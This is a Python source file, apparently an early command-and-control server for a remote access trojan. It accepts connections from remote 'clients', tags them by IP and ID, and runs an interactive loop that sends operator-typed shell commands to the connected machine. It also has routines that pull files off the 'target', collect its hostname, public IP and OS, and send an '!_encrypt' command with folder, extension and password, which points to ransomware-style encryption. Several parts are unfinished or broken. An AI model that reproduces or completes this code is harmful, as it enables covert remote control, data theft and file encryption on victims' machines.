## New Server Code

## Order: start socket, bind to address, and listen for connections. Each new
#connection needs to be in its own thread

import subprocess as sp
import socket
import threading
import time

import random
#import imports
#import Modules.Linux.linux_info
#import Modules.Windows.windows_info


HEADER = 64
FORMAT = 'utf-8'



class s_sock:
    ##########
    ## Main Thread
    ##########
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        
        self.server.listen()  
        
        clients = {}
        
        ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
        while True:
            self.conn, addr = self.server.accept()
            print("~New Connection~")
            
            ## Getting client id from the client, and the IP address
            ip_address = self.conn.getpeername()[0]
            id = self.conn.recv(1024).decode()
            
            ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
            
            client_name = "client_" + ip_address.replace(".", "_") + "_" + id
            
            ## creating object intance
            client = s_perclient()

            # something dict
            clients[client_name] = client
            
            ''' THis is what the dict looks like, each "name" is pointing at a class object
            clients = {
                "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
                "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
                "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
            }
            '''

            globals()[client_name] = client
            thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR))

            thread.start()        
    
            # list all s_perclient instances by name
            print("\n\n========Current Clients========")
            for var_name in globals():
                if var_name.startswith("client_"):
                    print(var_name)
            print("===============================\n\n")
            
        
            ## Interacting with client (temporarily here)
            ## dict 
            client_name = input("Enter a client name: ")

            # get the corresponding instance from the clients dictionary and call its method
            if client_name in clients:
                client_instance = clients[client_name]
                client_instance.client_do()
            else:
                print(f"{client_name} not found.")
            
            
            
            #self.client_interact()
            
    def client_interact(self):
        print("\n\n========Current Clients========")
        for var_name in globals():
            if var_name.startswith("client_"):
                print(var_name)
        print("===============================\n\n")
        
        
        ## dict 
        client_name = input("Enter a client name: ")

        # get the corresponding instance from the clients dictionary and call its method
        if client_name in clients:
            client_instance = clients[client_name]
            client_instance.client_do()
        else:
            print(f"{client_name} not found.")
    
    ##########
    ## In Sub Thread
    ##########
    
    ## Needs a rework, including seperating handle_client to just hanlde the connection, and 
    ## A  proper cliet_do tree. Rely on the instance to hold data when not using (aka self) instead
    ## of passing commands into decisions tree like handle client currenlty is
    
    ##TLDR: handle_client only handles client connections, call client_do for actually performing client actions
    
class s_perclient:
    
    ## Each thread runs this, which will handle the client appropriatly.
    def handle_client(self, conn, addr):
        self.conn = conn
        self.addr = addr
        ## redundant of self.addr but easier to use
        self.ip = addr[0]
        self.port = addr[1]
        
        print(self.conn, self.addr)
        
        
        print(f"New Connection from {conn.getpeername()}")
        
        ## Listening for anythinf from the client
        while True:
            # Receive message from client
            received_msg = conn.recv(1024).decode()
            if not received_msg:
                # Client has closed the connection, exit the loop

                print("Conn Closed\n\n")
                break
            
            # Process the received message
            self.decision_tree(received_msg)
            
        # Close the connection when the loop is over
        conn.close()
        
        ## class needs to die when done

    ## decision tree
    def decision_tree(self, msg):
        print(f"CLIENT SAYS: {msg}")

        if msg == "heartbeat":
            print("SERVER ACTION: client_do()")
            self.client_do()
        
    
    def client_do(self):
        print(f"CLIENT_DO {type(self).__name__}")
        
        ## Current job will be whatever the user wants to do... needs some thinking out on how to execute
        #current_job = "wait"
        current_job = "shell"
        
        if current_job == "wait":
            self.send_msg("wait")
            #here the client heartbeat timer resets & it waits
        
        elif current_job == "shell":
            while True:
                shellcommand = input("$: ") ## eventually this unput will be from a different connection (from logec client) for now its local
                print(self.send_msg(shellcommand))
        
        
    
    def send_msg(self, message):
        
        self.conn.send(message.encode())
        
        print(f"Message being sent: {message}")
        #print("waiting on recieve message")
        
        recieve_msg = self.conn.recv(1024).decode()
        
        return recieve_msg
        '''recieve_msg = self.conn.recv(1024).decode() ## was 10000
        
        if recieve_msg == None:
            print("ERR")
            #self.conected = False
        #else:
            #self.decision_tree(recieve_msg)

          ## why are you still encoded
        print(f"Message: {recieve_msg}") 
        return recieve_msg'''
    
    
    def file_download(self, message): ## << message is the same as file in this case
        import filetransfer_server as fts
        
        lst = []
        
        for i in message.split():
            lst.append(i)
            
        print(lst)
        
        LISTEN_IP = lst[0]
        LISTEN_PORT = lst[1]
        SAVE_FILEPATH = lst[2]
        FILE_TO_GET = lst[3]
            
        
        #LISTEN_IP = "0.0.0.0"
        #LISTEN_PORT = 5000
        #SAVE_FILEPATH = file
        
        ## sending details TO THE LISTEN SERVER
        ## needs to be in a thread to not block the lower from running
        
        server_recieve = threading.Thread(target=fts.s_recieve_file, args=(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH))
        server_recieve.start()
        
        #fts.s_recieve_file(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH)
        
        ## Sending TO THE CLIENT
        message = f"!_get {LISTEN_IP} {LISTEN_PORT} {FILE_TO_GET}" 
        self.start_server.conn.send(message.encode()) ## sending to client to send the file
        return True

    def get_os(self):
        message = "!_os-name"
        self.start_server.conn.send(message.encode())
        os_name_recieve = self.start_server.conn.recv(10000).decode()
        return os_name_recieve

    

class s_action:
    
    def c_get_hostname(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.hostname())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.hostname())
    
    def c_pub_ip(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.pub_ip())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.pub_ip())
            
    
    def c_os(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.os())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.os())

    
    def encryptor(folder, extension, password):
        s_sock.send_msg(s_sock, f"!_encrypt {folder} {extension} {password}")


if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    SERV = s_sock()
    SERV.start_server('0.0.0.0',8092)
   #SERV.client_interact()
    #while True:
    
    '''while True:
        shellcommand = input("$: ")
        SERV.send_msg(shellcommand)'''